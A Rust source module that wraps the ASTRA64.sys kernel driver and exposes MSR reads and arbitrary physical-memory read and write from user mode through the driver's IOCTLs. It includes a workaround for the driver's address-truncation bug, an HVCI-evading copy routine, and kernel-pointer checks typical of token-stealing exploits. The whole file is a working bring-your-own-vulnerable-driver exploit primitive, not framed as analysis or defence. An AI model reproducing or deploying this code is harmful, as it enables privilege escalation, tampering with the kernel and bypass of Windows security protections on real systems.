//! ASTRA64.sys driver wrapper: open + MSR read + physical R/W via the driver's
//! `\Device\PhysicalMemory` section mapping (IOCTL 0x80002008).
//!
//! Constants visible to other modules:
//!   - `SERVICE_NAME` / `DRIVER_FILENAME` for SCM install
//!   - `IA32_LSTAR` MSR index
//!   - `KUSD_VA` / `EX_FAST_REF_MASK` / `is_kptr` for kernel-pointer sanity checks

use std::ffi::c_void;
use std::mem;
use std::ptr;

use windows::core::PCWSTR;
use windows::Win32::Foundation::{CloseHandle, GENERIC_READ, GENERIC_WRITE, HANDLE};
use windows::Win32::Storage::FileSystem::{
    CreateFileW, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_SHARE_WRITE, OPEN_EXISTING,
};
use windows::Win32::System::IO::DeviceIoControl;
use windows::Win32::System::Memory::{
    UnmapViewOfFile, VirtualQuery, MEMORY_BASIC_INFORMATION, MEMORY_MAPPED_VIEW_ADDRESS, MEM_COMMIT,
};
use windows::Win32::System::Threading::GetCurrentProcess;

// ─── ASTRA64 driver constants ───────────────────────────────────────────────

pub const DEVICE_PATH:     &str = "\\\\.\\Astra32Device0";
pub const SERVICE_NAME:    &str = "ASTRA64";
pub const DRIVER_FILENAME: &str = "ASTRA64.sys";

const IOCTL_MAP_PHYS:  u32 = 0x80002008;
const IOCTL_READ_MSR:  u32 = 0x800020EC;

pub const IA32_LSTAR:       u32 = 0xC000_0082;
pub const EX_FAST_REF_MASK: u64 = 0xF;
pub const KUSD_VA:          u64 = 0xFFFFF780_00000000;

#[repr(C)]
#[derive(Clone, Copy)]
struct MapInput {
    interface_type: u32,    // OUT: low 32 bits of mapped VA (driver bug)
    bus_number:     u32,
    physical_addr:  u64,
    address_space:  u32,
    size:           u32,
}

pub fn is_kptr(v: u64) -> bool {
    v > 0xFFFF_8000_0000_0000 && v < 0xFFFF_FFFF_FFFF_FFF0
}

// ─── Driver wrapper ─────────────────────────────────────────────────────────

pub struct Astra {
    dev: HANDLE,
    hint_high: std::cell::Cell<u64>,
}

impl Astra {
    pub fn open() -> Result<Self, String> {
        let path: Vec<u16> = DEVICE_PATH.encode_utf16().chain(std::iter::once(0)).collect();
        let dev = unsafe {
            CreateFileW(
                PCWSTR(path.as_ptr()),
                (GENERIC_READ.0 | GENERIC_WRITE.0).into(),
                FILE_SHARE_READ | FILE_SHARE_WRITE,
                None, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, None,
            )
        }.map_err(|e| format!("open {}: {e}", DEVICE_PATH))?;
        Ok(Self { dev, hint_high: std::cell::Cell::new(0) })
    }

    pub fn read_msr(&self, idx: u32) -> Result<u64, String> {
        let mut io = [0u8; 8];
        io[..4].copy_from_slice(&idx.to_le_bytes());
        let mut ret = 0u32;
        unsafe {
            DeviceIoControl(
                self.dev, IOCTL_READ_MSR,
                Some(io.as_ptr() as _), 4,
                Some(io.as_mut_ptr() as _), 8,
                Some(&mut ret), None,
            )
        }.map_err(|e| format!("MSR IOCTL: {e}"))?;
        Ok(u64::from_le_bytes(io))
    }

    /// Map `size` bytes from physical address `phys` into our user VA space.
    /// The driver truncates the returned VA to 32 bits — we recover the
    /// upper half by walking with `VirtualQuery`, caching the last hit.
    fn map_phys(&self, phys: u64, size: u32) -> Option<usize> {
        let mut input = MapInput {
            interface_type: 0, bus_number: 0,
            physical_addr: phys, address_space: 0, size,
        };
        let mut ret = 0u32;
        unsafe {
            DeviceIoControl(
                self.dev, IOCTL_MAP_PHYS,
                Some(&input as *const _ as _), mem::size_of::<MapInput>() as u32,
                Some(&mut input as *mut _ as _), mem::size_of::<MapInput>() as u32,
                Some(&mut ret), None,
            )
        }.ok()?;
        let low = input.interface_type as u64;
        if low == 0 { return None; }

        let try_va = |hi: u64| -> Option<usize> {
            let cand = (hi << 32) | low;
            let mut mbi: MEMORY_BASIC_INFORMATION = unsafe { mem::zeroed() };
            let n = unsafe {
                VirtualQuery(
                    Some(cand as *const c_void),
                    &mut mbi,
                    mem::size_of::<MEMORY_BASIC_INFORMATION>(),
                )
            };
            (n > 0 && mbi.State == MEM_COMMIT).then_some(cand as usize)
        };

        if let Some(va) = try_va(self.hint_high.get()) { return Some(va); }
        for hi in 0..0x8000u64 {
            if hi == self.hint_high.get() { continue; }
            if let Some(va) = try_va(hi) {
                self.hint_high.set(hi);
                return Some(va);
            }
        }
        None
    }

    fn unmap(&self, va: usize) {
        let _ = unsafe { UnmapViewOfFile(MEMORY_MAPPED_VIEW_ADDRESS { Value: va as *mut c_void }) };
    }

    /// HVCI-safe memcpy via `ReadProcessMemory` — survives VTL 1 EPT faults
    /// that a raw deref would BSOD on.
    fn safe_copy_from(src: *const u8, dst: *mut u8, len: usize) -> bool {
        use windows::Win32::System::Diagnostics::Debug::ReadProcessMemory;
        let mut read: usize = 0;
        unsafe {
            ReadProcessMemory(
                GetCurrentProcess(),
                src as *const c_void,
                dst as *mut c_void,
                len,
                Some(&mut read),
            ).is_ok() && read == len
        }
    }

    pub fn read_phys(&self, addr: u64, buf: &mut [u8]) -> Result<(), String> {
        let mut pos = 0usize;
        let mut cur = addr;
        while pos < buf.len() {
            let page  = cur & !0xFFF;
            let off   = (cur & 0xFFF) as usize;
            let chunk = (buf.len() - pos).min(0x1000 - off);
            let va = self.map_phys(page, 0x1000)
                .ok_or_else(|| format!("map_phys read 0x{page:X}"))?;
            if !Self::safe_copy_from(
                (va + off) as *const u8,
                buf[pos..].as_mut_ptr(),
                chunk,
            ) {
                self.unmap(va);
                return Err(format!("phys read 0x{cur:X}"));
            }
            self.unmap(va);
            pos += chunk;
            cur += chunk as u64;
        }
        Ok(())
    }

    pub fn write_phys(&self, addr: u64, buf: &[u8]) -> Result<(), String> {
        let mut pos = 0usize;
        let mut cur = addr;
        while pos < buf.len() {
            let page  = cur & !0xFFF;
            let off   = (cur & 0xFFF) as usize;
            let chunk = (buf.len() - pos).min(0x1000 - off);
            let va = self.map_phys(page, 0x1000)
                .ok_or_else(|| format!("map_phys write 0x{page:X}"))?;
            unsafe {
                ptr::copy_nonoverlapping(
                    buf[pos..].as_ptr(),
                    (va + off) as *mut u8,
                    chunk,
                );
            }
            self.unmap(va);
            pos += chunk;
            cur += chunk as u64;
        }
        Ok(())
    }

    pub fn read_u32(&self, pa: u64) -> Result<u32, String> {
        let mut b = [0u8; 4]; self.read_phys(pa, &mut b)?; Ok(u32::from_le_bytes(b))
    }
    pub fn read_u64(&self, pa: u64) -> Result<u64, String> {
        let mut b = [0u8; 8]; self.read_phys(pa, &mut b)?; Ok(u64::from_le_bytes(b))
    }
    pub fn write_u64(&self, pa: u64, v: u64) -> Result<(), String> {
        self.write_phys(pa, &v.to_le_bytes())
    }
}

impl Drop for Astra {
    fn drop(&mut self) { unsafe { let _ = CloseHandle(self.dev); } }
}
